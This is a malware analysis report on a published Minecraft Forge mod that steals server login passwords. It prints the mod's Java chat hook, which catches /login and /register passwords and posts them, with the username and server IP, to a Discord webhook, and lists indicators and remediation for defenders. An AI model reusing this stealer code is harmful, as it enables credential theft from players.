# Case 019 — Login/password chat-logger mods (OSINT, source-read)

- **Verdict:** **confirmed malicious** (published source code, read directly)
- **Category:** Minecraft Forge mod that steals **server login passwords** and all chat, exfiltrating
  to a Discord webhook
- **Handling:** OSINT only. **Source read, never executed.**
- **Date:** 2026-11-18
- **Analyst:** OpenHands (open-source intelligence)
- **Primary source:** `bush1root/LoggerMod` — https://github.com/bush1root/LoggerMod
- **Evidence:** `evidence/log.java`, `evidence/ExampleMod.java`, `evidence/DiscordWebhook.java`

---

## 1. Verdict

`LoggerMod` ("Logger", Forge 1.12.2) is a mod whose only function is **credential theft**. It hooks
client chat, and whenever the player sends a login/registration command it forwards the
**password** to the attacker's Discord webhook — together with the username, server IP and ping.
It also ships a "detector" that watches for a server's 2FA/"VK-Auth" prompt and reports the victim.

This is a **published, self-described** stealer ("This mod on 1.12.2 steals the entered passwords"),
so no inference is needed — the code is the evidence.

## 2. The theft, verbatim (`evidence/log.java`)

```java
@SubscribeEvent
public void ChatEvent(ClientChatEvent e) throws IOException {
    String msg = e.getMessage();
    String[] sentences = e.getMessage().split(" ");

    if (!cfg.logAll) {
        if ((msg.startsWith("/l") || msg.startsWith("/login") ||
             msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
            webhookLogger.addEmbed(new DiscordWebhook.EmbedObject()
                .setTitle("Infinity")
                .setDescription("Minecraft Modification | Logger")
                .addField("USER",     Minecraft.getMinecraft().getSession().getUsername(), true)
                .addField("PASSWORD", sentences[1], true)                              // <-- the password
                .addField("SERVER",   Minecraft.getMinecraft().getCurrentServerData().serverIP, true)
                .addField("PING",     String.valueOf(...pingToServer), true));
            webhookLogger.execute();
        }
    } else {
        webhookLogger.setContent("```" + ...getUsername() + ": " + msg + "```");       // log ALL chat
        webhookLogger.execute();
    }
}

@SubscribeEvent
public void detector(ClientChatReceivedEvent e) {                                     // 2FA detector
    if (e.getMessage().getUnformattedText().contains("ВКонтакте")) {
        webhookDetector.setContent("DETECTED VK-AUTH MESSAGE: ...").execute();
    }
}
```

Key facts:

- **Target:** the login password typed into `/login`, `/l`, `/reg`, `/register` on **cracked/offline
  servers** (where players have server-side passwords).
- **Exfil:** a **Discord webhook** (`DiscordWebhook.java`, a stock HTTP POST client).
- **Session access too:** `getSession().getUsername()` — the same session object used by the
  token stealers (cases 001, 014, 016).
- **All-chat mode:** if `cfg.logAll`, it exfiltrates **every** chat line (privacy/credential leak).

## 3. Why it matters

Offline-mode (cracked) servers are common in the Minecraft community, and players reuse a
**password** there. A mod like this turns "install my mod" into a **server-account + password
stealer**. It is the same **mod-as-lure** model as Cluster A, just aimed at a different secret.

## 4. Indicators of compromise

```
class    me/bushroot/logger/log.class                 (chat hook)
class    me/bushroot/logger/webhook/DiscordWebhook.class
class    me/bushroot/logger/Connection.class
string   /login  /l  /reg  /register                  (trigger commands)
string   PASSWORD  USER  SERVER  PING                 (exfil fields)
string   discord.com/api/webhooks/                    (exfil channel)
string   ВКонтакте                                     (2FA detector)
```

## 5. Relationship to Cluster A

Same delivery premise (a mod the player runs) and same exfil channel (Discord webhook). Difference:
this steals **server login passwords**; Cluster A/016 steal the **Microsoft session token**. A
serious client can do both — which is why case 016 (session) and this case (passwords) should be
considered together.

## 6. Remediation

- Remove the mod; **change the server login password** (and any reused password) immediately.
- Because all chat may have been logged, rotate any secret ever typed in chat.
- Prefer official mods from a mod index; audit mods for chat hooks + webhook strings.

## 7. Caveats

- Published PoC/tooling (the author markets it as a logger); not independently re-verified by us.
- We read the source only — no execution.
